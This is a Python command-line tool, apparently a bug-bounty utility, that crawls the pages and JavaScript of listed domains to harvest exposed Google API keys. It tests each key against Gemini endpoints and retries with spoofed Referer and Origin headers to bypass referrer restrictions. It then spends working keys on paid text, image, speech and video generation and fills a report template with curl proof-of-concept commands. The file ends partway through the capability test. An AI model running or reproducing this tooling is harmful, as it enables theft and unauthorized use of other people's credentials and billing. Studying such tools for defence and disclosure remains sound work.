import requests
import re
import concurrent.futures
from colorama import Fore, Style, init, Back
from urllib.parse import urljoin, urlparse
import urllib3
import time
from typing import List, Set, Tuple
import argparse
from pathlib import Path
import json
from datetime import datetime
from tqdm import tqdm
import shutil
import base64
import os
import subprocess


def term_width():
    return max(40, min(120, shutil.get_terminal_size(fallback=(80, 24)).columns))

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

PATTERNS = {
    'Google API': re.compile(r'AIza[0-9A-Za-z_-]{35}'),
}

JS_PATTERNS = [
    re.compile(r'src=["\'](.*?\.js(?:\?[^"\']*)?)["\']'),
    re.compile(r'href=["\'](.*?\.js(?:\?[^"\']*)?)["\']'),
    re.compile(r'<script.*?src=["\'](.*?)["\']', re.IGNORECASE),
    re.compile(r'src=["\'](.*?\.js\.map(?:\?[^"\']*)?)["\']'),
    re.compile(r'href=["\'](.*?\.js\.map(?:\?[^"\']*)?)["\']'),
]

class Config:
    TIMEOUT = 8
    MAX_RETRIES = 2
    DELAY = 0.0
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    ]
    OUTPUT_DIR = None


class ColoredOutput:

    @staticmethod
    def print_banner():
        W = term_width()
        art = [
    r"     _____             _____                                                      ",
    r"  __|___  |__       __| __  |__  ______ __    _ ______  ______  ____    ____   _  ",
    r" |   ___|    | ___ |  |/ /     ||   ___|\ \  //|   ___||   ___||    \  |    \ | | ",
    r" |   |  |    ||___||     \     ||   ___| \ \//  `-.`-. |   |__ |     \ |     \| | ",
    r" |______|  __|     |__|\__\  __||______| /__/  |______||______||__|\__\|__/\____| ",
    r"    |_____|           |_____|                                                     ",
    r"                                                                                  ",
]
        colors = [Fore.CYAN, Fore.CYAN, Fore.GREEN, Fore.GREEN, Fore.YELLOW, Fore.YELLOW]
        print()
        for line, color in zip(art, colors):
            pad = max(0, (W - len(line)) // 2)
            print(f"{color}{Style.BRIGHT}{' ' * pad}{line}{Style.RESET_ALL}")
        sub = "[ Google API Key Scanner  |  By: Lostsec ]"
        pad = max(0, (W - len(sub)) // 2)
        print(f"\n{' ' * pad}{Fore.WHITE}{Style.DIM}{sub}{Style.RESET_ALL}\n")

    @staticmethod
    def success(msg):
        print(f"{Fore.GREEN}[/]{Style.RESET_ALL} {msg}")

    @staticmethod
    def error(msg):
        print(f"{Fore.RED}[x]{Style.RESET_ALL} {msg}")

    @staticmethod
    def info(msg):
        print(f"{Fore.CYAN}[i]{Style.RESET_ALL} {msg}")

    @staticmethod
    def warning(msg):
        print(f"{Fore.YELLOW}[-]{Style.RESET_ALL} {msg}")

    @staticmethod
    def found_key(key, url, is_js=False):
        source = "JS File" if is_js else "Web Page"
        W = term_width() - 2
        label = " GOOGLE API KEY FOUND! "
        side = max(0, W - len(label))
        left = side // 2
        right = side - left
        inner = W - 2 
        prefix_key    = "  Key    : "
        prefix_url    = "  URL    : "
        prefix_source = "  Source : "

        def wrap_line(prefix, text, color):
            avail = inner - len(prefix)
            lines = []
            while len(text) > avail:
                lines.append(text[:avail])
                text = text[avail:]
                avail = inner - len(prefix)
            lines.append(text)
            out = []
            for i, part in enumerate(lines):
                if i == 0:
                    out.append(f"{Fore.GREEN}│{Style.RESET_ALL}{prefix}{color}{part}{Style.RESET_ALL}")
                else:
                    out.append(f"{Fore.GREEN}│{Style.RESET_ALL}{' '*len(prefix)}{color}{part}{Style.RESET_ALL}")
            return out

        tqdm.write("")
        tqdm.write(f"{Fore.GREEN}┌{'─'*left}{label}{'─'*right}┐{Style.RESET_ALL}")
        for line in wrap_line(prefix_key, key, Fore.WHITE):
            tqdm.write(line)
        for line in wrap_line(prefix_url, url, Fore.CYAN):
            tqdm.write(line)
        for line in wrap_line(prefix_source, source, Fore.YELLOW):
            tqdm.write(line)
        tqdm.write(f"{Fore.GREEN}└{'─'*W}┘{Style.RESET_ALL}")
        tqdm.write("")


class APIScanner:
    def __init__(self, config: Config, quiet_mode: bool = False):
        import threading
        self.config = config
        self.quiet_mode = quiet_mode
        self.found_keys: Set[Tuple[str, str, str]] = set()
        self.displayed_keys: Set[str] = set()
        self.scanned_urls: Set[str] = set()
        self._lock = threading.Lock()
        self.session = self._create_session()
        self.all_findings = []  
        self.stats = {
            'total_scanned': 0,
            'total_js_files': 0,
            'total_findings': 0,
            'errors': 0
        }
        self._ensure_output_dir()

    def _ensure_output_dir(self):
        if self.config.OUTPUT_DIR:
            self.config.OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        return session

    def _get_headers(self) -> dict:
        import random
        return {
            'User-Agent': random.choice(self.config.USER_AGENTS),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }

    def extract_js_files(self, url: str, content: str) -> List[str]:
        js_files = set()
        for pattern in JS_PATTERNS:
            matches = pattern.findall(content)
            for match in matches:
                js_url = match[0] if isinstance(match, tuple) else match
                full_url = urljoin(url, js_url)
                if self._is_valid_url(full_url) and full_url not in self.scanned_urls:
                    js_files.add(full_url)
        return list(js_files)

    def _is_valid_url(self, url: str) -> bool:
        try:
            result = urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except:
            return False

    def scan_content(self, url: str, content: str, is_js: bool = False) -> List[dict]:
        findings = []
        for key_type, pattern in PATTERNS.items():
            matches = pattern.findall(content)
            for match in matches:
                key_tuple = (url, key_type, match)
                show = False
                with self._lock:
                    if key_tuple in self.found_keys:
                        continue
                    self.found_keys.add(key_tuple)
                    finding = {
                        'url': url,
                        'type': key_type,
                        'key': match,
                        'is_js': is_js,
                        'timestamp': datetime.now().isoformat()
                    }
                    findings.append(finding)
                    self.all_findings.append(finding) 
                    self.stats['total_findings'] += 1
                    if not self.quiet_mode and match not in self.displayed_keys:
                        self.displayed_keys.add(match)
                        show = True
                if show:
                    ColoredOutput.found_key(match, url, is_js)
        return findings

    def fetch_url(self, url: str) -> Tuple[bool, str]:
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc or ' ' in url:
                return False, ""
        except Exception:
            return False, ""

        last_error = False
        for attempt in range(self.config.MAX_RETRIES):
            try:
                response = self.session.get(
                    url,
                    timeout=(3, self.config.TIMEOUT),
                    verify=False,
                    headers=self._get_headers(),
                    allow_redirects=True
                )
                if response.status_code == 200:
                    return True, response.text
                elif response.status_code == 429:
                    time.sleep(3)
                    continue
                last_error = True
                continue
            except Exception:
                last_error = True
                continue

        if last_error:
            self.stats['errors'] += 1
        return False, ""

    def process_domain(self, domain: str) -> List[dict]:
        domain = domain.strip()
        if not domain or domain.startswith('#'):
            return []
        if domain.startswith('*') or domain.startswith('.'):
            return []

        if not domain.startswith('http'):
            urls_to_try = [f"https://{domain}", f"http://{domain}"]
        else:
            urls_to_try = [domain]

        all_findings = []

        for url in urls_to_try:
            if url in self.scanned_urls:
                continue

            self.scanned_urls.add(url)
            self.stats['total_scanned'] += 1

            success, content = self.fetch_url(url)
            if success:
                findings = self.scan_content(url, content)
                all_findings.extend(findings)

                js_files = self.extract_js_files(url, content)

                self.stats['total_js_files'] += len(js_files)

                for js_url in js_files:
                    js_findings = self.scan_js_file(js_url)
                    all_findings.extend(js_findings)

                break

        return all_findings

    def scan_js_file(self, js_url: str) -> List[dict]:
        if js_url in self.scanned_urls:
            return []
        self.scanned_urls.add(js_url)
        success, content = self.fetch_url(js_url)
        if success:
            return self.scan_content(js_url, content, is_js=True)
        return []

    def save_results(self, findings: List[dict], output_file: str) -> str:
        output_path = Path(output_file)
        output_path.parent.mkdir(parents=True, exist_ok=True)

        try:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write("="*70 + "\n")
                f.write("GOOGLE API KEYS - SCAN RESULTS\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*70 + "\n\n")

                for finding in findings:
                    f.write(f"KEY: {finding['key']}\n")
                    f.write(f"URL: {finding['url']}\n")
                    f.write(f"SOURCE: {'JavaScript File' if finding['is_js'] else 'Web Page'}\n")
                    f.write("-"*70 + "\n")

            ColoredOutput.success(f"Keys saved → {output_path}")
            return str(output_path)
        except Exception as e:
            ColoredOutput.error(f"Failed to save results: {e}")
            return str(output_path)

    def generate_report(self):
        W = term_width()
        print(f"\n{Fore.CYAN}{'='*W}")
        print(f"{Fore.YELLOW}  SCAN SUMMARY")
        print(f"{Fore.CYAN}{'='*W}{Style.RESET_ALL}")
        print(f"  URLs Scanned   : {Fore.CYAN}{self.stats['total_scanned']}")
        print(f"  JS Files       : {Fore.CYAN}{self.stats['total_js_files']}")
        print(f"  API Keys Found : {Fore.GREEN}{self.stats['total_findings']}")
        print(f"  Errors         : {Fore.RED}{self.stats['errors']}")
        print(f"{Fore.CYAN}{'='*W}{Style.RESET_ALL}\n")



def verify_key(api_key: str, target_url: str = "") -> Tuple[str, str]:
    url = f"https://generativelanguage.googleapis.com/v1beta/corpora?key={api_key}"

    try:
        resp = requests.get(url, timeout=10)

        if resp.status_code == 403:
            if target_url:
                parsed = urlparse(target_url)
                spoofed_domain = f"{parsed.scheme}://{parsed.netloc}/"
                spoofed_headers = {
                    "Referer": spoofed_domain,
                    "Origin": spoofed_domain.rstrip('/')
                }
                resp_spoofed = requests.get(url, headers=spoofed_headers, timeout=10)
                if resp_spoofed.status_code == 200:
                    return "VULNERABLE_BYPASS", f"HTTP 200 — Gemini API accessible via Referer Spoofing → {parsed.netloc}"

            auto_headers = {
                "Referer": "https://www.google.com/",
                "Origin": "https://www.google.com"
            }
            resp_auto = requests.get(url, headers=auto_headers, timeout=10)
            if resp_auto.status_code == 200:
                return "VULNERABLE_BYPASS", "HTTP 200 — Gemini API accessible via Referer Spoofing → google.com"

        if resp.status_code == 200:
            return "VULNERABLE", "HTTP 200 — Gemini API accessible"
        elif resp.status_code == 400:
            return "INVALID", "HTTP 400 — Invalid format"
        elif resp.status_code == 403:
            return "RESTRICTED", "Not Vulnerable"
        elif resp.status_code == 429:
            return "QUOTA_EXCEEDED", "HTTP 429 — Rate limit"
        else:
            return "INVALID", f"HTTP {resp.status_code}"

    except requests.exceptions.Timeout:
        return "ERROR", "Timeout"
    except Exception as e:
        return "ERROR", str(e)


def load_keys_from_file(filepath: str) -> List[Tuple[str, str]]:
    results = {}
    key_pattern = re.compile(r'AIza[0-9A-Za-z_-]{35}')
    path = Path(filepath)
    if not path.exists():
        return []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        sections = content.split("-" * 70)
        for section in sections:
            key_matches = key_pattern.findall(section)
            url_match = re.search(r'URL:\s*(.*)', section)
            url = url_match.group(1).strip() if url_match else ""
            
            for key in key_matches:
                if key not in results:
                    results[key] = url
                
    except Exception as e:
        ColoredOutput.error(f"Error reading file: {e}")
        return []
    return list(results.items())


def run_verify(key_file: str, output_file: str, target_domain: str = ""):
    W = term_width()
    print(f"\n{Fore.CYAN}{'='*W}")
    print(f"{Fore.YELLOW}  API KEY VERIFY MODE")
    print(f"{Fore.CYAN}{'='*W}{Style.RESET_ALL}\n")

    key_pairs = load_keys_from_file(key_file)
    if not key_pairs:
        ColoredOutput.warning("No Google API keys found in file.")
        return

    ColoredOutput.info(f"Loaded {Fore.YELLOW}{len(key_pairs)}{Style.RESET_ALL} unique key(s) from file\n")

    vulnerable = []
    restricted = []
    invalid = []

    if target_domain:
        domain_url = target_domain if target_domain.startswith('http') else f'https://{target_domain}'
        key_pairs = [(k, u if u else domain_url) for k, u in key_pairs]

    for key, url in tqdm(key_pairs, desc="Verifying", bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}'):
        status, detail = verify_key(key, url)
        W = term_width() - 2

        if status == "VULNERABLE":
            vulnerable.append((key, detail))
            label = " VULNERABLE KEY FOUND! "
            side = max(0, W - len(label))
            left = side // 2
            right = side - left
            tqdm.write("")
            tqdm.write(f"{Fore.RED}┌{'─'*left}{label}{'─'*right}┐{Style.RESET_ALL}")
            tqdm.write(f"{Fore.RED}│{Style.RESET_ALL}  Key    : {Fore.WHITE}{key}{Style.RESET_ALL}")
            if url:
                tqdm.write(f"{Fore.RED}│{Style.RESET_ALL}  URL    : {Fore.CYAN}{url}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.RED}│{Style.RESET_ALL}  Status : {Fore.RED}{status}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.RED}│{Style.RESET_ALL}  Detail : {Fore.GREEN}{detail}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.RED}└{'─'*W}┘{Style.RESET_ALL}")
            tqdm.write("")
        elif status == "VULNERABLE_BYPASS":
            vulnerable.append((key, detail))
            label = " VULNERABLE! 403 BYPASSED! "
            side = max(0, W - len(label))
            left = side // 2
            right = side - left
            tqdm.write("")
            tqdm.write(f"{Fore.RED}┌{'─'*left}{label}{'─'*right}┐{Style.RESET_ALL}")
            tqdm.write(f"{Fore.RED}│{Style.RESET_ALL}  Key    : {Fore.WHITE}{key}{Style.RESET_ALL}")
            if url:
                tqdm.write(f"{Fore.RED}│{Style.RESET_ALL}  URL    : {Fore.CYAN}{url}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.RED}│{Style.RESET_ALL}  Status : {Fore.YELLOW}403 BYPASSED → HTTP 200{Style.RESET_ALL}")
            tqdm.write(f"{Fore.RED}│{Style.RESET_ALL}  Detail : {Fore.GREEN}{detail}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.RED}└{'─'*W}┘{Style.RESET_ALL}")
            tqdm.write("")
        elif status == "RESTRICTED":
            restricted.append((key, detail))
        elif status == "QUOTA_EXCEEDED":
            invalid.append((key, detail))
            label = " QUOTA EXCEEDED "
            side = max(0, W - len(label))
            left = side // 2
            right = side - left
            tqdm.write("")
            tqdm.write(f"{Fore.MAGENTA}┌{'─'*left}{label}{'─'*right}┐{Style.RESET_ALL}")
            tqdm.write(f"{Fore.MAGENTA}│{Style.RESET_ALL}  Key    : {Fore.WHITE}{key}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.MAGENTA}│{Style.RESET_ALL}  Status : {Fore.MAGENTA}{status}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.MAGENTA}│{Style.RESET_ALL}  Detail : {Fore.WHITE}{detail}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.MAGENTA}└{'─'*W}┘{Style.RESET_ALL}")
            tqdm.write("")
        else:
            invalid.append((key, detail))
            label = " INVALID KEY "
            side = max(0, W - len(label))
            left = side // 2
            right = side - left
            tqdm.write("")
            tqdm.write(f"{Fore.GREEN}┌{'─'*left}{label}{'─'*right}┐{Style.RESET_ALL}")
            tqdm.write(f"{Fore.GREEN}│{Style.RESET_ALL}  Key    : {Fore.WHITE}{key}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.GREEN}│{Style.RESET_ALL}  Status : {Fore.GREEN}{status}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.GREEN}│{Style.RESET_ALL}  Detail : {Fore.WHITE}{detail}{Style.RESET_ALL}")
            tqdm.write(f"{Fore.GREEN}└{'─'*W}┘{Style.RESET_ALL}")
            tqdm.write("")
        
        time.sleep(0.3)

    W2 = term_width()
    print(f"\n{Fore.CYAN}{'='*W2}")
    print(f"{Fore.YELLOW}  VERIFY SUMMARY")
    print(f"{Fore.CYAN}{'='*W2}{Style.RESET_ALL}")
    print(f"  Total Checked  : {Fore.CYAN}{len(key_pairs)}")
    print(f"  Vulnerable     : {Fore.RED}{len(vulnerable)}")
    print(f"  Restricted     : {Fore.YELLOW}{len(restricted)}")
    print(f"  Invalid/Other  : {Fore.GREEN}{len(invalid)}")
    print(f"{Fore.CYAN}{'='*W2}{Style.RESET_ALL}\n")

    output_path = Path(output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    
    if not vulnerable:
        ColoredOutput.warning("No vulnerable keys found. Output file not created.")
        return

    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write("="*70 + "\n")
            f.write("VULNERABLE GOOGLE API KEYS\n")
            f.write(f"Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*70 + "\n\n")
            for k, d in vulnerable:
                f.write(f"KEY: {k}\n")
                f.write(f"STATUS: {d}\n")
                f.write("-"*70 + "\n")
        ColoredOutput.success(f"Results saved → {output_path}")
    except Exception as e:
        ColoredOutput.error(f"Failed to save results: {e}")

    try:
        print(f"\n{Fore.YELLOW}Do you want to run Capability Testing on vulnerable key(s)? (yes/no): {Style.RESET_ALL}", end="", flush=True)
        cap_input = input().strip().lower()
        if cap_input in ['yes', 'y']:
            for vkey, _ in vulnerable:
                run_capability_test(vkey)
        else:
            print(f"\n{Fore.CYAN}Skipping capability testing.{Style.RESET_ALL}\n")
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Fore.YELLOW}Skipping capability testing.{Style.RESET_ALL}\n")



_GEMINI_BASE = "https://generativelanguage.googleapis.com/v1beta"

_GEMINI_PRICING = {
    "text":       {"input_per_million": 0.30, "output_per_million": 2.50},
    "image":      {"per_image": 0.02},
    "tts":        {"output_per_million_audio": 10.00},
    "video_fast": {"per_second": 0.15},
    "video":      {"per_second": 0.40},
}

_CAPABILITY_REPORT = """\
# Google API Key Exposed — Gemini Capabilities Confirmed

- Severity : High
- Date     : {date_utc}
- API Key  : {api_key}

## Summary
The provided Google API key is accepted by Gemini endpoints.
Detected / confirmed capabilities:
{capabilities_list}

This enables unauthorized image/video/audio generation and text chat,
potentially incurring significant charges and exhausting quotas.

## Steps To Reproduce (PoC)

### List available models
```
curl -s "{gemini_base}/models?key={api_key}" | jq '.'
```

### Text (chat)
```
curl -s -X POST "{gemini_base}/models/{text_model}:generateContent" \\
  -H "x-goog-api-key: {api_key}" -H "Content-Type: application/json" \\
  -d '{{"contents":[{{"parts":[{{"text":"Explain how AI works in a few words"}}]}}]}}'
```

### Image (Imagen 4 Fast)
```
curl -s -X POST "{gemini_base}/models/imagen-4.0-generate-001:predict" \\
  -H "x-goog-api-key: {api_key}" -H "Content-Type: application/json" \\
  -d '{{"instances":[{{"prompt":"Robot holding a red skateboard"}}],"parameters":{{"sampleCount":1}}}}' \\
  | jq -r '.. | objects | .bytesBase64Encoded? // empty' | head -n1 | base64 --decode > imagen4.png
```

### Video (Veo 3 Fast)
```
KEY={api_key}
BASE={gemini_base}
OP=$(curl -s "$BASE/models/veo-3.0-fast-generate-001:predictLongRunning" \\
  -H "x-goog-api-key: $KEY" -H "Content-Type: application/json" -X POST \\
  -d '{{"instances":[{{"prompt":"A cinematic 5-second shot of a lantern swaying gently."}}]}}' | jq -r .name)
while true; do
  S=$(curl -s -H "x-goog-api-key: $KEY" "$BASE/$OP")
  [ "$(echo $S | jq -r .done)" = "true" ] && \\
    curl -L -H "x-goog-api-key: $KEY" \\
      -o video.mp4 "$(echo $S | jq -r '.response.generateVideoResponse.generatedSamples[0].video.uri')" && break
  sleep 5
done
```

### TTS — Single Speaker
```
curl -s "{gemini_base}/models/{tts_model}:generateContent" \\
  -H "x-goog-api-key: {api_key}" -H "Content-Type: application/json" \\
  -d '{{"contents":[{{"parts":[{{"text":"Say cheerfully: Have a wonderful day!"}}]}}],"generationConfig":{{"responseModalities":["AUDIO"],"speechConfig":{{"voiceConfig":{{"prebuiltVoiceConfig":{{"voiceName":"Kore"}}}}}}}}}}' \\
  | jq -r '.candidates[0].content.parts[]|select(.inlineData)|.inlineData.data' | base64 --decode > tts.pcm
ffmpeg -y -f s16le -ar 24000 -ac 1 -i tts.pcm tts.wav
```

### TTS — Multi-Speaker
```
curl -s "{gemini_base}/models/{tts_model}:generateContent" \\
  -H "x-goog-api-key: {api_key}" -H "Content-Type: application/json" \\
  -d '{{"contents":[{{"parts":[{{"text":"Joe: How is it going Jane?\\nJane: Not too bad, you?"}}]}}],"generationConfig":{{"responseModalities":["AUDIO"],"speechConfig":{{"multiSpeakerVoiceConfig":{{"speakerVoiceConfigs":[{{"speaker":"Joe","voiceConfig":{{"prebuiltVoiceConfig":{{"voiceName":"Kore"}}}}}},{{"speaker":"Jane","voiceConfig":{{"prebuiltVoiceConfig":{{"voiceName":"Puck"}}}}}}]}}}}}}}}' \\
  | jq -r '.candidates[0].content.parts[]|select(.inlineData)|.inlineData.data' | base64 --decode > tts_multi.pcm
ffmpeg -y -f s16le -ar 24000 -ac 1 -i tts_multi.pcm tts_multi.wav
```

## Impact Estimate (Illustrative)

{pricing_table}

Estimated Total (this run): ${total_cost:.4f}
Source: https://ai.google.dev/gemini-api/docs/pricing (snapshot 2025-09-29)

## Evidence Files
{evidence_list}
"""


def _cap_fetch_models(api_key: str):
    try:
        resp = requests.get(
            f"{_GEMINI_BASE}/models?key={api_key}",
            timeout=12
        )
        return resp.status_code, (resp.json() if resp.content else {})
    except Exception:
        return 0, {}


def _cap_build_matrix(payload: dict) -> dict:
    caps = {"text": [], "image": [], "tts": [], "video": []}
    for m in payload.get("models", []):
        name = m.get("name", "").split("/")[-1].lower()
        if "imagen" in name:
            caps["image"].append(name)
        elif "veo" in name:
            caps["video"].append(name)
        elif "tts" in name:
            caps["tts"].append(name)
        elif any(x in name for x in ("gemini", "flash", "pro")):
            caps["text"].append(name)
    return caps


def _cap_test_text(api_key: str, model: str) -> bool:
    try:
        resp = requests.post(
            f"{_GEMINI_BASE}/models/{model}:generateContent",
            headers={"x-goog-api-key": api_key, "Content-Type": "application/json"},
            json={"contents": [{"parts": [{"text": "Say hi in exactly 3 words."}]}]},
            timeout=15
        )
        return resp.status_code == 200
    except Exception:
        return False


def _cap_test_imagen4(api_key: str, out_dir: str) -> bool:
    try:
        resp = requests.post(
            f"{_GEMINI_BASE}/models/imagen-4.0-generate-001:predict",
            headers={"x-goog-api-key": api_key, "Content-Type": "application/json"},
            json={
                "instances": [{"prompt": "A red robot holding a skateboard, photorealistic"}],
                "parameters": {"sampleCount": 1}
            },
            timeout=40
        )
        if resp.status_code != 200:
            return False

        def _find_b64(obj):
            if isinstance(obj, dict):
                if "bytesBase64Encoded" in obj:
                    return obj["bytesBase64Encoded"]
                for v in obj.values():
                    r = _find_b64(v)
                    if r:
                        return r
            elif isinstance(obj, list):
                for item in obj:
                    r = _find_b64(item)
                    if r:
                        return r
            return None

        b64 = _find_b64(resp.json())
        if b64:
            with open(os.path.join(out_dir, "imagen4.png"), "wb") as f:
                f.write(base64.b64decode(b64))
            return True
        return False
    except Exception:
        return False


def _cap_test_tts(api_key: str, model: str, out_dir: str, multi: bool = False) -> bool:
    try:
        if multi:
            payload = {
                "contents": [{"parts": [{"text": "Joe: How's it going Jane?\nJane: Not too bad, how about you?"}]}],
                "generationConfig": {
                    "responseModalities": ["AUDIO"],
                    "speechConfig": {"multiSpeakerVoiceConfig": {"speakerVoiceConfigs": [
                        {"speaker": "Joe",  "voiceConfig": {"prebuiltVoiceConfig": {"voiceName": "Kore"}}},
                        {"speaker": "Jane", "voiceConfig": {"prebuiltVoiceConfig": {"voiceName": "Puck"}}}
                    ]}}
                }
            }
            fname = "multi_speaker"
        else:
            payload = {
                "contents": [{"parts": [{"text": "Say cheerfully: Have a wonderful day!"}]}],
                "generationConfig": {
                    "responseModalities": ["AUDIO"],
                    "speechConfig": {"voiceConfig": {"prebuiltVoiceConfig": {"voiceName": "Kore"}}}
                }
            }
            fname = "single_speaker"

        resp = requests.post(
            f"{_GEMINI_BASE}/models/{model}:generateContent",
            headers={"x-goog-api-key": api_key, "Content-Type": "application/json"},
            json=payload,
            timeout=30
        )
        if resp.status_code != 200:
            return False

        b64 = None
        try:
            for p in resp.json()["candidates"][0]["content"]["parts"]:
                if "inlineData" in p:
                    b64 = p["inlineData"]["data"]
                    break
        except Exception:
            pass

        if b64:
            pcm_path = os.path.join(out_dir, f"{fname}.pcm")
            wav_path = os.path.join(out_dir, f"{fname}.wav")
            with open(pcm_path, "wb") as f:
                f.write(base64.b64decode(b64))
            try:
                subprocess.run(
                    ["ffmpeg", "-y", "-f", "s16le", "-ar", "24000", "-ac", "1",
                     "-i", pcm_path, wav_path],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15
                )
            except Exception:
                pass
            return True
        return False
    except Exception:
        return False


def _cap_test_video(api_key: str, out_dir: str) -> bool:
    models_to_try = [
        "veo-3.0-fast-generate-001",
        "veo-3.0-generate-001",
    ]
    for veo_model in models_to_try:
        try:
            resp = requests.post(
                f"{_GEMINI_BASE}/models/{veo_model}:predictLongRunning",
                headers={"x-goog-api-key": api_key, "Content-Type": "application/json"},
                json={"instances": [{"prompt": "A cinematic 5-second shot of a lantern swaying gently in the wind."}]},
                timeout=30
            )
            if resp.status_code != 200:
                continue

            op_name = resp.json().get("name")
            if not op_name:
                continue

            for _ in range(24):
                time.sleep(5)
                poll = requests.get(
                    f"{_GEMINI_BASE}/{op_name}",
                    headers={"x-goog-api-key": api_key},
                    timeout=20
                )
                if poll.status_code != 200:
                    continue
                pdata = poll.json()
                if pdata.get("done"):
                    try:
                        video_uri = (
                            pdata["response"]["generateVideoResponse"]
                                 ["generatedSamples"][0]["video"]["uri"]
                        )
                        vid_resp = requests.get(
                            video_uri,
                            headers={"x-goog-api-key": api_key},
                            timeout=60,
                            stream=True
                        )
                        if vid_resp.status_code == 200:
                            vid_path = os.path.join(out_dir, "Generated_Video.mp4")
                            with open(vid_path, "wb") as f:
                                for chunk in vid_resp.iter_content(chunk_size=8192):
                                    f.write(chunk)
                            return True
                    except Exception:
                        pass
                    return False
            return False
        except Exception:
            continue
    return False


def _est_text()          -> float: return (50 / 1_000_000) * _GEMINI_PRICING["text"]["input_per_million"]
def _est_image(n=1)      -> float: return _GEMINI_PRICING["image"]["per_image"] * n
def _est_tts(secs=2)     -> float: return (secs * 32 / 1_000_000) * _GEMINI_PRICING["tts"]["output_per_million_audio"]
def _est_video(secs=5)   -> float: return _GEMINI_PRICING["video_fast"]["per_second"] * secs


def run_capability_test(api_key: str, no_video: bool = False, no_tts: bool = False):
    W = term_width()
    masked = f"{api_key[:8]}...{api_key[-4:]}"

    print(f"\n{Fore.MAGENTA}{'═'*W}")
    print(f"{Fore.YELLOW}  CAPABILITY TESTING  →  {Fore.WHITE}{masked}")
    print(f"{Fore.MAGENTA}{'═'*W}{Style.RESET_ALL}\n")

    out_dir = os.path.join("gemini_evidence", api_key[-8:])
    os.makedirs(out_dir, exist_ok=True)
    ColoredOutput.info(f"Evidence directory : {Fore.YELLOW}{out_dir}{Style.RESET_ALL}")

    ColoredOutput.info("Fetching available Gemini models...")
    status, payload = _cap_fetch_models(api_key)
    if status != 200:
        ColoredOutput.error("Could not reach Gemini model list. Skipping capability test.")
        return

    caps       = _cap_build_matrix(payload)
    text_model = (caps["text"] + ["gemini-2.5-flash"])[0]
    tts_model  = (caps["tts"]  + ["gemini-2.5-flash-preview-tts"])[0]

    evidence_files: List[str] = []
    rows:           List[dict] = []
    total_cost = 0.0

    ColoredOutput.info(f"Testing text generation ({text_model})...")
    if _cap_test_text(api_key, text_model):
        ColoredOutput.success("Text generation  : OK")
        c = _est_text()
        total_cost += c
        rows.append({"Capability": "Text", "Unit": "~50 tokens",
                     "Cost": f"~${c:.5f}", "Notes": "Gemini 2.5 Flash"})
    else:
        ColoredOutput.warning("Text generation  : Failed / Not supported")

    ColoredOutput.info("Testing image generation (Imagen 4 Fast)...")
    if _cap_test_imagen4(api_key, out_dir):
        img_path = os.path.join(out_dir, "imagen4.png")
        ColoredOutput.success(f"Image saved      : {img_path}")
        evidence_files.append("imagen4.png")
        c = _est_image(1)
        total_cost += c
        rows.append({"Capability": "Image", "Unit": "1 image",
                     "Cost": f"${c:.2f}", "Notes": "Imagen 4 Fast (paid)"})
    else:
        ColoredOutput.warning("Image generation : Failed / Not supported")

    if not no_tts:
        ColoredOutput.info(f"Testing TTS — single speaker ({tts_model})...")
        if _cap_test_tts(api_key, tts_model, out_dir, multi=False):
            f_wav = os.path.join(out_dir, "single_speaker.wav")
            f_pcm = os.path.join(out_dir, "single_speaker.pcm")
            saved = "single_speaker.wav" if os.path.exists(f_wav) else "single_speaker.pcm"
            ColoredOutput.success(f"TTS single saved : {os.path.join(out_dir, saved)}")
            evidence_files.append(saved)
            c = _est_tts(2)
            total_cost += c
            rows.append({"Capability": "Audio (single)", "Unit": "~2 sec",
                         "Cost": f"~${c:.5f}", "Notes": "TTS Flash"})
        else:
            ColoredOutput.warning("TTS single       : Failed / Not supported")

        ColoredOutput.info(f"Testing TTS — multi-speaker ({tts_model})...")
        if _cap_test_tts(api_key, tts_model, out_dir, multi=True):
            f_wav = os.path.join(out_dir, "multi_speaker.wav")
            f_pcm = os.path.join(out_dir, "multi_speaker.pcm")
            saved = "multi_speaker.wav" if os.path.exists(f_wav) else "multi_speaker.pcm"
            ColoredOutput.success(f"TTS multi saved  : {os.path.join(out_dir, saved)}")
            evidence_files.append(saved)
            c = _est_tts(2)
            total_cost += c
            rows.append({"Capability": "Audio (multi)", "Unit": "~2 sec",
                         "Cost": f"~${c:.5f}", "Notes": "TTS Flash multi-speaker"})
        else:
            ColoredOutput.warning("TTS multi        : Failed / Not supported")

    if not no_video:
        ColoredOutput.info("Testing video generation (Veo 3 Fast, 5 s) — may take ~60 s...")
        if _cap_test_video(api_key, out_dir):
            vid_path = os.path.join(out_dir, "Generated_Video.mp4")
            ColoredOutput.success(f"Video saved      : {vid_path}")
            evidence_files.append("Generated_Video.mp4")
